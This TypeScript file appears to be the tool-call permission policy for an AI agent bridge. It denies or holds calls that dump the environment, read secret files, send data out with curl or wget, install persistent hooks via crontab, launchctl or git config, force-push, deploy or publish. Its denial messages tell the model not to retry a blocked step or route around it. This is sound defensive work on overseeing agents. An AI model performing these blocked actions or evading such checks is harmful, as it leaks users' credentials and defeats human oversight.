  { id: "floor.payment", label: "a password, a payment or a 2FA code", roots: () => [], connector: handsOff, handOff: true },
];

/** A command that prints the whole environment (`env`, `printenv`) or one variable (`printenv VAR`), leaking the bridge's secrets. */
const dumpsEnv = (p: Extract<Part, { kind: "bash" }>) => p.verb === "env" || p.verb === "printenv";
/** Expansion of a variable whose name marks it a secret: the bridge's own CLAUDIOBOT_*, or any *_TOKEN / *_KEY / *_SECRET. */
const SENSITIVE_ENV = /\$\{?(CLAUDIOBOT_[A-Za-z0-9_]+|[A-Za-z][A-Za-z0-9]*_(TOKEN|KEY|SECRET|PASSWORD|CREDENTIALS?)|GITHUB_TOKEN|GH_TOKEN|ANTHROPIC_API_KEY|[A-Z0-9]*TOKEN)\}?/;

function floorHit(floor: Floor, call: ToolCall, view: View, ctx: PolicyContext): boolean {
  if (floor.connector && isConnector(call) && floor.connector(call)) return true;
  if (floor.bash && view.parts.some((p) => p.kind === "bash" && floor.bash!(p))) return true;
  if (floor.raw && floor.raw(view.parts.filter((p): p is Extract<Part, { kind: "bash" }> => p.kind === "bash"), ctx)) return true;
  if (floor.write) {
    for (const p of view.parts) for (const t of p.touches) if (t.write && (floor.write(t.real, ctx) || floor.write(t.lexical, ctx))) return true;
  }
  if (floor.id === "floor.secretfile") {
    for (const p of view.parts) for (const t of p.touches) if (SECRET_FILES.test(basename(t.real)) || SECRET_FILES.test(basename(t.lexical))) return true;
  }
  const roots = floor.roots(ctx);
  if (roots.length > 0) {
    const realRoots = roots.map(ctx.realpath);
    const except = floor.except?.(ctx) ?? [];
    for (const p of view.parts)
      for (const t of p.touches)
        if (roots.some((r, i) => hits(t, r, realRoots[i]!)) && !except.some((e) => under(t.real, e))) return true;
    if (floor.rawScan && view.raw !== "" && rawScanHit(scannable(view), roots, realRoots, ctx)) return true;
  }
  return false;
}

/** A flag and the value it carries, inline (`--body=x`) or as the next word (`--body x`), dropped from a command's args. */
function dropValues(args: string[], flags: ReadonlySet<string>): string[] {
  const out: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    const name = a.split("=")[0]!;
    if (flags.has(name)) {
      if (!a.includes("=")) i++; // skip the separate-word value too
      continue;
    }
    out.push(a);
  }
  return out;
}
const COMMIT_MSG_FLAGS = new Set(["-m", "--message", "-F", "--file"]);
const GH_BODY_FLAGS = new Set(["-b", "--body", "-F", "--body-file", "-t", "--title"]);

/** The text a floor's raw scan should see: data arguments (an echo string, a commit message, a PR body, a grep pattern)
 *  are dropped, because a protected path named only there is not read; a path a command actually reads stays. */
function scanTextOf(verb: string, words: string[]): string {
  if (verb === "echo" || verb === "printf") return "";
  if (verb === "git") {
    const g = gitArgs(words);
    if (g?.sub === "commit") return dropValues(g.args, COMMIT_MSG_FLAGS).join(" ");
  }
  if (verb === "gh") {
    const g = ghArgs(words);
    if (g && (g.sub === "pr" || g.sub === "issue") && ["create", "comment", "edit"].includes(g.args[0] ?? "")) return dropValues(g.args, GH_BODY_FLAGS).join(" ");
  }
  if (verb === "grep" || verb === "rg") {
    // The first non-flag argument is the search pattern, data not a path; the file operands after it stay.
    const pattern = words.findIndex((w, i) => i > 0 && !w.startsWith("-"));
    return (pattern === -1 ? words : [...words.slice(0, pattern), ...words.slice(pattern + 1)]).join(" ");
  }
  return words.join(" ");
}
const scannable = (view: View) => (view.raw === "" ? "" : view.parts.filter((p) => p.kind === "bash").map((p) => scanTextOf((p as Extract<Part, { kind: "bash" }>).verb, (p as Extract<Part, { kind: "bash" }>).words)).join("\n"));

/** The raw command spelled a protected root literally (inside python -c, node -e, a heredoc): deny it anyway. */
function rawScanHit(raw: string, rootsLex: string[], rootsReal: string[], ctx: PolicyContext): boolean {
  const home = ctx.scope.homedir;
  const needles = new Set<string>();
  for (const r of [...rootsLex, ...rootsReal]) {
    needles.add(r);
    if (r.startsWith(home)) for (const h of ["~", "$HOME", "${HOME}"]) needles.add(h + r.slice(home.length));
  }
  return [...needles].some((n) => raw.includes(n));
}

const floorReason = (f: Floor) =>
  f.handOff
    ? `This step needs ${f.label}, which only the user may enter. It did not run. Ask the user to do this step themselves, then carry on.`
    : `This touches ${f.label}, which the bridge never allows. It did not run. Do not retry it or reach it another way.`;

const BANS: readonly { id: string; tools: readonly string[]; applies: (i: Initiator) => boolean; reason: string }[] = [
  {
    id: "ban.routine_admin",
    tools: [claudio("set_routine"), claudio("delete_routine")],
    applies: isRoutineChain,
    reason: "Routines cannot create, change or delete routines, even when run by hand. It did not run. Tell the user what you wanted to change.",
  },
  {
    id: "ban.hops",
    tools: [claudio("message_bot"), claudio("create_bot")],
    applies: (i) => hopsOf(i) >= 2,
    reason: "This work came through 2 or more bot-to-bot messages, so it cannot message or create bots. It did not run. Finish with what you have.",
  },
  {
    id: "ban.no_turn",
    tools: [claudio("message_bot")],
    applies: (i) => i.kind === "system",
    reason: "No turn is in flight, so there is nothing to message another bot about. It did not run.",
  },
];

/** A call the bridge refuses outright before the table: a claudio tool it does not serve, or a connector the user turned off. */
function refusedOf(call: ToolCall, ctx: PolicyContext): Decision | null {
  if (isClaudio(call) && claudioEntry(call) === undefined)
    return deny("rule", "claudio.unknown", `The bridge has no tool ${call.tool}. It did not run.`);
  if (isConnector(call) && call.mcpServer !== null && ctx.connectorsOff.includes(call.mcpServer.name))
    return deny("rule", "connector.off", `The user turned off the ${call.mcpServer.name} connector for this bot. It did not run. Do not try it again.`);
  return null;
}

function limitOf(call: ToolCall, ctx: PolicyContext): Decision | null {
  const h = ctx.headroom;
  if (!h.ok)
    return h.reason === "daily_cap"
      ? deny("limit", "limit.daily_cap", `This bot's daily spending cap is reached, so nothing more runs until ${h.until}. It did not run. End your turn.`)
      : deny("limit", "limit.agent_budget", "This agent's budget is used up. It did not run. End your turn and report what you have.");
  const cap = DAILY_CAPS[call.tool];
  if (cap !== undefined && (ctx.callsToday[call.tool] ?? 0) >= cap) {
    const name = call.tool.replace("mcp__claudio__", "");
    return deny("limit", `limit.${name}`, `This bot already used ${name} ${cap} times today, the daily limit. It did not run. Tell the user instead.`);
  }
  return null;
}

type Cell = "pass" | "ask";
type CellOf = Cell | ((part: Part, ctx: PolicyContext) => Cell);
type Row = { id: string; label: string; match: (part: Part, ctx: PolicyContext) => boolean; attended: CellOf; unattended: CellOf; offerAlways?: boolean };

const bash = (test: (words: string[], text: string, part: Extract<Part, { kind: "bash" }>, ctx: PolicyContext) => boolean) => (p: Part, ctx: PolicyContext) =>
  p.kind === "bash" && test(p.words, p.text, p, ctx);
const re = (pattern: RegExp) => bash((_, text) => pattern.test(text));
const tool = (test: (call: ToolCall, ctx: PolicyContext) => boolean) => (p: Part, ctx: PolicyContext) => p.kind === "call" && test(p.call, ctx);

/** The first non-option word after a command, past the options that take a value. */
function subcommand(words: string[], from: number, valued: readonly string[]): { sub: string; args: string[] } | null {
  let i = from;
  while (i < words.length && words[i]!.startsWith("-")) i += valued.includes(words[i]!) ? 2 : 1;
  return i < words.length ? { sub: words[i]!, args: words.slice(i + 1) } : null;
}

/** git's subcommand and the words after it, past global options such as -C <dir>. */
function gitArgs(words: string[]): { sub: string; args: string[] } | null {
  if (basename(words[0] ?? "") !== "git") return null;
  return subcommand(words, 1, ["-C", "-c", "--git-dir", "--work-tree", "--namespace"]);
}
const git = (sub: string, test: (args: string[]) => boolean = () => true) =>
  bash((words) => {
    const g = gitArgs(words);
    return g !== null && g.sub === sub && test(g.args);
  });

/** gh's subcommand and its args, past the global flags that come before it. */
function ghArgs(words: string[]): { sub: string; args: string[] } | null {
  if (basename(words[0] ?? "") !== "gh") return null;
  return subcommand(words, 1, ["-R", "--repo", "--hostname"]);
}

/** A git remote that is a URL (`https://…`, `git@host:…`, `ssh://…`), not a named remote configured in the repo. */
const isGitUrl = (remote: string) => /:\/\//.test(remote) || /^[^/\s]+@[^/\s]+:/.test(remote) || remote.startsWith("file://");

/** A push forces history over the remote: -f, a short cluster that contains f (-fu, -uf, -vf), a --force* abbreviation, or a + refspec. */
const pushForce = (args: string[]) =>
  args.some((a) => a.startsWith("-") && !a.startsWith("--") && /f/.test(a)) ||
  args.some((a) => /^--forc?e?(-with-lease|-if-includes)?(=.*)?$/.test(a)) ||
  args.some((a) => a.startsWith("+") && a.length > 1 && !a.includes(":/"));

/** A branch command that drops commits: -D, a short cluster that contains D (-fD, -Df), or --delete with --force. */
const branchForce = (args: string[]) => args.some((a) => /^-[A-Za-z]*D/.test(a)) || (args.includes("--delete") && args.includes("--force"));

/** A push targets the default branch when a refspec's destination resolves to main/master, is a wildcard, or is dynamic. */
const pushesDefault = (args: string[]): boolean => {
  const flags = args.filter((a) => a.startsWith("-"));
  if (flags.some((f) => /^--(all|mirror|tags|follow-tags)$/.test(f))) return true;
  const nonFlags = args.filter((a) => !a.startsWith("-") && !a.startsWith("+"));
  const refspecs = nonFlags.slice(1); // the first non-flag is the remote; the rest are refspecs
  if (refspecs.length === 0) return true; // bare `git push` / remote-only pushes the current branch, which may be default
  // A bare `HEAD` pushes the current branch under its own name (a feature branch); only an explicit main/master target counts.
  return refspecs.some((r) => {
    const dst = r.split(":").pop() ?? "";
    return /^(refs\/heads\/)?(main|master)$/.test(dst) || dst.includes("*") || dst.includes("$");
  });
};

/** The HTTP method a curl/gh request sets, from -X/--method/--request in any spelling, or null. */
function httpMethod(args: string[]): string | null {
  for (let k = 0; k < args.length; k++) {
    const a = args[k]!;
    if (a.startsWith("--")) {
      const [name, inline] = a.slice(2).split("=") as [string, string | undefined];
      if (name === "method" || name === "request") return (inline ?? args[k + 1] ?? "").toUpperCase();
    } else if (/^-[A-Za-z]*X/.test(a)) {
      const after = a.slice(a.indexOf("X") + 1);
      return (after || args[k + 1] || "").toUpperCase();
    }
  }
  return null;
}
const WRITE_METHOD = (m: string | null) => m === "POST" || m === "PUT" || m === "PATCH" || m === "DELETE";

/** curl sends a body or follows a config file (-d/-F/-T/-K, --data*, --form, --upload-file, a write method). */
function curlSends(args: string[]): boolean {
  for (let k = 0; k < args.length; k++) {
    const a = args[k]!;
    if (a.startsWith("--")) {
      const name = a.slice(2).split("=")[0]!;
      if (/^data/.test(name) || name === "form" || name === "form-string" || name === "upload-file" || name === "config" || name === "json") return true;
    } else if (a.startsWith("-") && a.length > 1) {
      const cluster = a.slice(1);
      if (/[dFTK]/.test(cluster)) return true;
    }
  }
  return WRITE_METHOD(httpMethod(args));
}

/** wget writes a request body or sets a non-GET method. */
function wgetSends(args: string[]): boolean {
  return args.some((a) => /^--(post-data|post-file|body-data|body-file)\b/.test(a)) || WRITE_METHOD((args.find((a) => a.startsWith("--method")) ?? "").split("=")[1]?.toUpperCase() ?? httpMethod(args));
}

const inScope = (real: string, ctx: PolicyContext) => under(real, ctx.scope.own) || (ctx.scope.userMd !== null && real === ctx.scope.userMd);
/** Throwaway roots a recursive delete may reach without asking: build caches and temp dirs the bot never relies on. */
const SCRATCH_ROOTS = (ctx: PolicyContext) => [
  process.env.TMPDIR ?? "/tmp",
  "/tmp",
  "/private/tmp",
  "/private/var/folders",
  "/var/folders",
  ...["" + ".cache", ".npm/_cacache", ".bun/install/cache", "Library/Caches", "Library/Developer/Xcode/DerivedData"].map((r) => resolve(ctx.scope.homedir, r)),
];
const inScratch = (real: string, ctx: PolicyContext) => SCRATCH_ROOTS(ctx).some((r) => under(real, ctx.realpath(r)) || under(real, r));
/** A recursive-delete operand that is outside the bot's own scope and not a throwaway cache/temp dir. */
const deletesOutside = (path: string, cwd: string, ctx: PolicyContext) => {
  const p = path.replace(/\$\{?TMPDIR\}?/g, process.env.TMPDIR ?? "/tmp"); // $TMPDIR is a scratch root
  const real = ctx.realpath(absRaw(expandHome(p, ctx, cwd), cwd));
  return !inScope(real, ctx) && !inScratch(real, ctx);
};
const outside = (path: string, cwd: string, ctx: PolicyContext) => !inScope(ctx.realpath(absRaw(expandHome(path, ctx, cwd), cwd)), ctx);

const FILE_WRITES = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const WRITE_VERBS = new Set([
  "send", "post", "create", "update", "delete", "remove", "merge", "publish", "comment", "reply", "invite", "transfer",
  "push", "upload", "share", "archive", "close", "approve", "submit", "cancel", "write", "edit", "move", "set", "put",
  "patch", "run", "exec", "execute", "trigger", "deploy", "enable", "disable", "revoke", "buy", "order", "charge", "pay",
  "tweet", "drop", "rm", "provision", "destroy", "scale", "rollout", "restart", "dispatch", "star", "insert", "add", "draft",
]);
const READ_VERBS = new Set(["get", "list", "read", "search", "find", "fetch", "describe", "view", "query", "count"]);
const verbsOf = (call: ToolCall) => wordsOf(call.tool.split("__").slice(2).join("_"));
const SHELL_DEPLOY = { npm: ["-w", "--workspace", "--otp", "--prefix", "--registry"], pnpm: ["--filter", "-C", "--dir"], yarn: [], bun: [], kubectl: ["--context", "-n", "--namespace"], terraform: [], aws: [], gcloud: [], az: [], wrangler: [], docker: [], helm: [], sam: [], cdk: [], eas: [] } as const;
const DEPLOY_VERBS = new Set(["deploy", "publish", "push", "apply", "destroy", "delete", "create", "update", "sync", "promote", "rollback", "install", "upgrade", "uninstall", "submit", "up", "scale", "rollout", "unpublish"]);

/** The meaningful subcommand of a per-tool CLI, past that tool's global value-flags. */
function deploySub(words: string[]): { tool: string; sub: string; args: string[] } | null {
  const t = basename(words[0] ?? "");
  const valued = (SHELL_DEPLOY as Record<string, readonly string[]>)[t];
  if (valued === undefined) return null;
  let s = subcommand(words, 1, valued);
  if (t === "yarn" && s?.sub === "npm") s = subcommand(s.args, 0, []);
  return s === null ? null : { tool: t, sub: s.sub, args: s.args };
}

/**
 * The policy of each tool on the bridge's own claudio server: null passes, else a row (by attended/unattended). Keyed on
 * every name tools.ts serves, so a new tool cannot ship unclassified; a call naming any other claudio tool is denied.
 * The row ids are the signatures' suffixes, so they never change once an Always rule may name them.
 */
const CLAUDIO: Readonly<Record<ClaudioTool, { id: string; label: string; attended: Cell; unattended: Cell } | null>> = {
  ask: null,
  start_agent: { id: "claudio.start_agent", label: "Start a coding agent", attended: "pass", unattended: "ask" },
  message_agent: null,
  list_projects: null,
  message_bot: null,
  create_bot: { id: "claudio.create_bot", label: "Create a bot", attended: "pass", unattended: "ask" },
  update_self: null,
  set_routine: { id: "claudio.routines", label: "Change routines", attended: "pass", unattended: "ask" },
  delete_routine: { id: "claudio.routines", label: "Change routines", attended: "pass", unattended: "ask" },
  list_routines: null,
  routine_no_update: null,
  remember: { id: "claudio.remember", label: "Remember something", attended: "pass", unattended: "ask" },
  save_skill: { id: "claudio.save_skill", label: "Save a skill", attended: "pass", unattended: "ask" },
};
const claudioName = (call: ToolCall) => call.tool.slice("mcp__claudio__".length);
const claudioEntry = (call: ToolCall) => (Object.hasOwn(CLAUDIO, claudioName(call)) ? CLAUDIO[claudioName(call) as ClaudioTool] : undefined);
const CLAUDIO_ROWS: readonly Row[] = [...new Map(Object.values(CLAUDIO).flatMap((e) => (e === null ? [] : [[e.id, e] as const]))).values()].map((e) => ({
  id: e.id,
  label: e.label,
  match: tool((c) => isClaudio(c) && claudioEntry(c)?.id === e.id),
  attended: e.attended,
  unattended: e.unattended,
}));

/** First matching row wins per part; the strictest part wins per call. The only list of risky commands in the bridge. */
const TABLE: readonly Row[] = [
  {
    id: "self.escalate",
    label: "Change a config file that controls how it runs",
    match: (p, ctx) => p.touches.some((t) => t.write && (ESCALATE.config(t.real, ctx) || ESCALATE.config(t.lexical, ctx))),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "memory.user",
    label: "Edit USER.md, which every bot reads",
    match: (p, ctx) => ctx.scope.userMd !== null && p.touches.some((t) => t.write && (t.real === ctx.scope.userMd || t.lexical === ctx.scope.userMd)),
    attended: "pass",
    unattended: "ask",
  },
  {
    id: "dynamic.command",
    label: "Run a command it builds at runtime",
    match: (p) => p.kind === "bash" && p.dynamicCmd,
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "git.rewrite",
    label: "Force-push or rewrite history",
    match: bash((words) => {
      const g = gitArgs(words);
      if (g === null) return false;
      if (g.sub === "push") return pushForce(g.args);
      if (g.sub === "reset") return g.args.includes("--hard") && g.args.some((a) => a.includes("/"));
      return g.sub === "branch" && branchForce(g.args);
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "git.push.remote",
    label: "Push to a URL or a just-added remote",
    match: (p) => p.kind === "bash" && p.pushUntrusted,
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "git.push.default",
    label: "Push to the default branch",
    match: git("push", pushesDefault),
    attended: "ask",
    unattended: "ask",
  },
  { id: "git.push", label: "Push a branch", match: git("push"), attended: "pass", unattended: "ask" },
  { id: "gh.merge", label: "Merge a pull request", match: bash((w) => { const g = ghArgs(w); return g?.sub === "pr" && g.args[0] === "merge"; }), attended: "ask", unattended: "ask" },
  {
    id: "gh.admin",
    label: "Delete, archive or rename a GitHub repo",
    match: bash((w) => { const g = ghArgs(w); return g?.sub === "repo" && ["delete", "archive", "rename"].includes(g.args[0] ?? ""); }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "gh.api.danger",
    label: "A protected GitHub API write",
    match: bash((w) => {
      const g = ghArgs(w);
      if (g?.sub !== "api") return false;
      const m = httpMethod(g.args);
      if (!WRITE_METHOD(m)) return false;
      const path = g.args.find((a) => !a.startsWith("-") && !/^(GET|POST|PUT|PATCH|DELETE)$/i.test(a)) ?? "";
      return m === "DELETE" || /\/merge$|\/git\/refs|\/branches\/.*\/protection/.test(path);
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "gh.post",
    label: "Post on GitHub",
    match: bash((w) => {
      const g = ghArgs(w);
      if (g === null) return false;
      if ((g.sub === "issue" || g.sub === "pr") && ["comment", "create", "close", "edit", "review", "reopen", "ready", "lock"].includes(g.args[0] ?? "")) return true;
      if (g.sub === "repo" && g.args[0] === "create") return true;
      if (g.sub === "gist" && g.args[0] === "create") return true;
      if (g.sub === "release" && ["upload", "delete"].includes(g.args[0] ?? "")) return true;
      if (g.sub === "workflow" && g.args[0] === "run") return true;
      if (g.sub === "run" && g.args[0] === "rerun") return true;
      // gh api with a field/body argument defaults to POST even without an explicit method.
      return g.sub === "api" && (WRITE_METHOD(httpMethod(g.args)) || g.args.some((a) => /^(-f|-F|--field|--raw-field|--input|--data)/.test(a)));
    }),
    attended: "pass",
    unattended: "ask",
  },
  {
    id: "publish",
    label: "Publish a package or a release",
    match: bash((words) => {
      if (words.includes("--dry-run")) return false; // a dry run uploads nothing
      const d = deploySub(words);
      if (d && (d.tool === "npm" || d.tool === "pnpm" || d.tool === "yarn" || d.tool === "bun") && ["publish", "unpublish", "dist-tag", "deprecate"].includes(d.sub)) return true;
      const g = ghArgs(words);
      if (g?.sub === "release" && g.args[0] === "create") return true;
      return /^cargo publish\b|^twine upload\b|^gem push\b|^poetry publish\b/.test(words.join(" "));
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "deploy",
    label: "Deploy or change infrastructure",
    match: bash((words, text) => {
      if (words.includes("--dry-run")) return false; // a dry run changes nothing
      const v = basename(words[0] ?? "");
      // vercel/netlify take the prod flag with or without a `deploy` subcommand, and promote/rollback also change prod.
      if (v === "vercel" || v === "netlify") return words.some((a) => a.startsWith("--prod") || a === "--target=production") || ["promote", "rollback"].includes(words[1] ?? "");
      const d = deploySub(words);
      if (d) {
        if (d.tool === "wrangler" && (["deploy", "publish"].includes(d.sub) || ["deploy", "publish"].includes(d.args[0] ?? ""))) return true;
        if (d.tool === "docker" && d.sub === "push") return true;
        if (d.tool === "kubectl" && ["apply", "delete", "scale", "rollout"].includes(d.sub)) return true;
        if (d.tool === "helm" && ["install", "upgrade", "uninstall"].includes(d.sub)) return true;
        if (d.tool === "terraform" && ["apply", "destroy"].includes(d.sub)) return true;
        if ((d.tool === "sam" || d.tool === "cdk") && d.sub === "deploy") return true;
        if (d.tool === "eas" && d.sub === "submit") return true;
        // aws/gcloud/az: a cheap write-verb heuristic over the subcommand words (create, sync, update-function-code, …).
        if ((d.tool === "aws" || d.tool === "gcloud" || d.tool === "az") && [d.sub, ...d.args].some((a) => [...DEPLOY_VERBS].some((verb) => a === verb || a.startsWith(`${verb}-`)))) return true;
      }
      return /^(?:fly|flyctl) deploy\b|^firebase deploy\b|^pulumi up\b/.test(text);
    }),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  { id: "secrets", label: "Set a secret", match: re(/^gh secret set\b|^vercel env add\b|^security add-/), attended: "ask", unattended: "ask", offerAlways: false },
  {
    id: "persist.command",
    label: "Install something that keeps running outside the gate",
    match: bash((words, _, part) => {
      const v = part.verb;
      if (v === "crontab") return words.includes("-") || words.includes("-e"); // install a crontab from stdin or the editor
      if (v === "launchctl") return ["submit", "load", "bootstrap"].includes(words[1] ?? "");
      if (v === "defaults") return words[1] === "write";
      if (v === "git") {
        // `git -c core.pager=…` / `-c alias.x=!…` runs a command through config; set the same keys with `git config`.
        if (words.some((a, i) => a === "-c" && /^(core\.(pager|sshcommand|fsmonitor)=|alias\.[^=]*=!)/i.test(words[i + 1] ?? ""))) return true;
        const g = gitArgs(words);
        if (g?.sub === "config") {
          const key = g.args.find((a) => !a.startsWith("-")) ?? "";
          return /^core\.(hookspath|fsmonitor)$/i.test(key) || (/^alias\./i.test(key) && g.args.some((a) => a.startsWith("!") || a.includes("=!")));
        }
      }
      return false;
    }),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "run.shell",
    label: "Run shell input from a pipe, a trap or stdin",
    match: (p) => p.kind === "bash" && (p.verb === "trap" || p.shellStdin),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "http.send",
    label: "Send data to a web service",
    match: bash((words, _, part) => {
      if (part.verb !== "curl" && part.verb !== "wget") return false;
      // Posting to the loopback host is a local dev server, not exfiltration.
      if (words.some((a) => /^(https?:\/\/)?(localhost|127\.0\.0\.1|\[::1\])(:|\/|$)/.test(a) || /\.localhost(:|\/|$)/.test(a))) return false;
      return part.verb === "curl" ? curlSends(words.slice(1)) : wgetSends(words.slice(1));
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "net.hosts",
    label: "Reach a host outside the network allowlist",
    match: tool((call) => hostsOf(call).length > 0),
    attended: "pass",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "rm.outside",
    label: "Delete files outside its folder",
    match: bash((words, _, part, ctx) => {
      if (part.verb !== "rm" || !part.recursive) return false;
      // A recursive delete with a runtime-built operand could be anywhere, so ask; otherwise ask only for a real
      // operand that lands outside the bot's own folder and is not a throwaway cache/temp dir.
      if (part.emptyDynamicRm) return true;
      return words.slice(1).some((w) => !w.startsWith("-") && part.cwds.some((cwd) => deletesOutside(w, cwd, ctx)));
    }),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "fs.outside",
    label: "Change files outside its folder",
    match: tool((call, ctx) => {
      if (!FILE_WRITES.has(call.tool)) return false;
      const path = call.input.file_path ?? call.input.notebook_path;
      return typeof path === "string" && outside(path, call.cwd, ctx);
    }),
    attended: "pass",
    unattended: "ask",
  },
  {
    id: "connector.act",
    label: "Act through a connector",
    match: tool((call) => isConnector(call)),
    attended: (p) => (p.kind === "call" && verbsOf(p.call).some((w) => WRITE_VERBS.has(w)) ? "ask" : "pass"),
    unattended: (p) => (p.kind === "call" && verbsOf(p.call).some((w) => READ_VERBS.has(w)) ? "pass" : "ask"),
  },
  ...CLAUDIO_ROWS,
];

/** A part's row: the cell for this initiator and the signature Always and Never cover. */
type Ruled = { row: Row; cell: Cell; signature: Signature; label: string };

const alwaysText = (label: string, isAttended: boolean) =>
  isAttended ? `${label}, without asking, in turns you start` : `${label}, without asking, in any turn, routines included`;

const deny = (via: DenyVia, rule: string, reason: string, handOff = false): Decision => ({ kind: "deny", via, rule, reason, handOff });

/**
 * Checks in this order, and fails closed: a matcher that throws is a deny naming its rule.
 *   1. floors: the bridge home (except the acting bot's own bots/<id>/ and USER.md; agents get no exception), a config
 *      file the bridge loads (self-escalation), SSH/GPG/cloud keys and the Keychain, browser profiles and cookies,
 *      cookie/login/key stores by name, stored credentials, password/payment/2FA entry (handOff). Paths match as
 *      written and on realpath; ancestors of a root count for recursive verbs and glob/$ words; the raw text is
 *      scanned for a root spelled literally; the bot's own absolute home path never matches the bridge floor.
 *   2. initiator bans: no set_routine / delete_routine in a routine chain (world.isRoutineChain); message_bot and
 *      create_bot at world.hopsOf >= 2; message_bot with no turn in flight. Then refusals: a claudio tool the bridge
 *      does not serve, and a connector the user turned off for this bot.
 *   3. limits: headroom not ok; daily caps on create_bot and start_agent per bot.
 *   4. Never rules, on any part's signature.
 *   5. a one-shot grant with this actor and fingerprint (the gate consumes it).
 *   6. Always rules, by signature and attendance. Only a call whose every part is covered is allowed outright.
 *   7. the rule table, by attended(initiator). Bash is split into segments and the strictest segment wins.
 *   8. pass. The SDK's own Agent and SubagentHandback calls always pass.
 */
export function decide(call: ToolCall, ctx: PolicyContext): Decision {
  if (SDK_INTERNAL.has(call.tool)) return PASS;
  // A command too long to scan in bounded time is held rather than parsed, so the hook never freezes the bridge.
  if (call.tool === "Bash" && typeof call.input.command === "string" && call.input.command.length > MAX_BASH_LEN)
    return { kind: "ask", rule: "bash.toolong", label: "Run a very long shell command", signature: "Bash:bash.toolong" as Signature, always: "", offerAlways: false };
  const at: { via: DenyVia; rule: string } = { via: "floor", rule: "floor.paths" };
  try {
    const view = viewOf(call, ctx);
    for (const floor of FLOORS) {
      at.rule = floor.id;
      if (floorHit(floor, call, view, ctx)) return deny("floor", floor.id, floorReason(floor), floor.handOff ?? false);
    }

    at.via = "initiator";
    for (const ban of BANS) {
      at.rule = ban.id;
      if (ban.tools.includes(call.tool) && ban.applies(ctx.initiator)) return deny("initiator", ban.id, ban.reason);
    }

    at.via = "rule";
    at.rule = "refused";
    const refusal = refusedOf(call, ctx);
    if (refusal) return refusal;

    at.via = "limit";
    at.rule = "limit";
    const limited = limitOf(call, ctx);
    if (limited) return limited;

    at.via = "rule";
    const isAttended = attended(ctx.initiator);
    const ruled = view.parts.map((part): Ruled | null => {
      for (const row of TABLE) {
        at.rule = row.id;
        if (row.match(part, ctx)) {
          const subject = part.kind === "call" && isConnector(part.call) ? `${row.label}: ${mcpName(part.call.tool)}` : row.label;
          const toolName = part.kind === "bash" ? "Bash" : part.call.tool;
          const cellOf = isAttended ? row.attended : row.unattended;
          return { row, cell: typeof cellOf === "function" ? cellOf(part, ctx) : cellOf, signature: `${toolName}:${row.id}` as Signature, label: subject };
        }
      }
      return null;
    });

    at.via = "never";
    at.rule = "rules";
    for (const r of ruled) {
      const never = r && ctx.rules.find((s) => s.decision === "deny" && s.signature === r.signature);
      if (never) return deny("never", never.signature, `The user said never to this (${never.label}). It did not run. Do not try it or anything equivalent, now or later.`);
    }

    const print = fingerprint(call);
    const key = actorKey(ctx.actor);
    const grant = ctx.grants.find((g) => g.actor === key && g.fingerprint === print && g.expiresAt > ctx.now);
    if (grant) return { kind: "allow", via: "grant", rule: print, cardId: grant.cardId };

    const covering = (r: Ruled | null) =>
      r === null ? undefined : ctx.rules.find((s) => s.decision === "allow" && s.signature === r.signature && (s.appliesTo === "all" || isAttended));
    const covers = ruled.map(covering);
    const first = covers[0];
    if (first && covers.every((c) => c !== undefined)) return { kind: "allow", via: "always", rule: first.signature, cardId: first.cardId };

    const held = ruled.find((r, i) => r !== null && r.cell === "ask" && covers[i] === undefined);
    if (held) return { kind: "ask", rule: held.row.id, label: held.label, signature: held.signature, always: alwaysText(held.label, isAttended), offerAlways: held.row.offerAlways ?? true };
    return PASS;
  } catch {
    return deny(at.via, at.rule, `The bridge could not check this call against ${at.rule}, so it was blocked and did not run. Do not retry it this turn.`);
  }
}

function sorted(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(sorted);
  if (isRecord(value)) return Object.fromEntries(Object.keys(value).sort().map((k) => [k, sorted(value[k])]));
  return value;
}

/** Tool plus a hash of the meaningful input. Bash: the command and any hosts. Write: path and content. MCP: the whole input. */
export function fingerprint(call: ToolCall): Fingerprint {
  const hosts = hostsOf(call);
  const command = String(call.input.command).trim();
  const meaningful = call.tool === "Bash" ? (hosts.length > 0 ? `${command}\nallowed_domains=${hosts.join(",")}` : command) : JSON.stringify(sorted(call.input));
  return `${call.tool}:${sha256(meaningful).slice(0, 32)}` as Fingerprint;
}

const lines = (s: string) => (s === "" ? 0 : s.split("\n").length - (s.endsWith("\n") ? 1 : 0));
const CLIP = 4096;

/** The card's detail line: the exact command, "Write <path> (N lines)", or an MCP tool with compact JSON. Secrets masked. */
export function detailOf(call: ToolCall): string {
  const i = call.input;
  switch (call.tool) {
    case "Bash": {
      const hosts = hostsOf(call);
      return clip(maskSecrets(String(i.command).trim() + (hosts.length > 0 ? ` (network: ${hosts.join(", ")})` : "")), CLIP);
    }
    case "Write":
      return maskSecrets(`Write ${String(i.file_path)} (${lines(String(i.content))} lines)`);
    case "Edit":
    case "MultiEdit":
      return maskSecrets(`${call.tool} ${String(i.file_path)}`);
    case "NotebookEdit":
      return maskSecrets(`NotebookEdit ${String(i.notebook_path)}`);
    default:
      return clip(maskSecrets(`${call.tool} ${JSON.stringify(i)}`), 500);
  }
}
